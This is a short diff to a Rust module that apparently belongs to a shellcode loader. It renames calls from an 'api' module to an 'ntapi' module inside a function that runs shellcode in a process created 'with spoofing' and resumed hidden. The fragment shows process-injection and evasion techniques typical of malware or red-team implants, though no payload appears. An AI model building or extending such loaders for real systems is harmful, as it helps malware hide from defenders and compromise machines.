@@ -1,6 +1,6 @@
 mod structs;
 
-use crate::api::*;
+use crate::ntapi::*;
 use self::structs::*;
 use std::ffi::c_void;
 use std::ptr;
@@ -21,10 +21,10 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
     let process_id = if let Some(existing_pid) = pid {
         existing_pid
     } else {
-        let process_info = crate::api::create_process_with_spoofing(target_program.as_str(), true)?;
+        let process_info = crate::ntapi::create_process_with_spoofing(target_program.as_str(), true)?;
         
         // Resume immediately with SW_HIDE
-        crate::api::resume_thread(process_info.hThread)?;
+        crate::ntapi::resume_thread(process_info.hThread)?;
         
         process_info.dwProcessId
     };
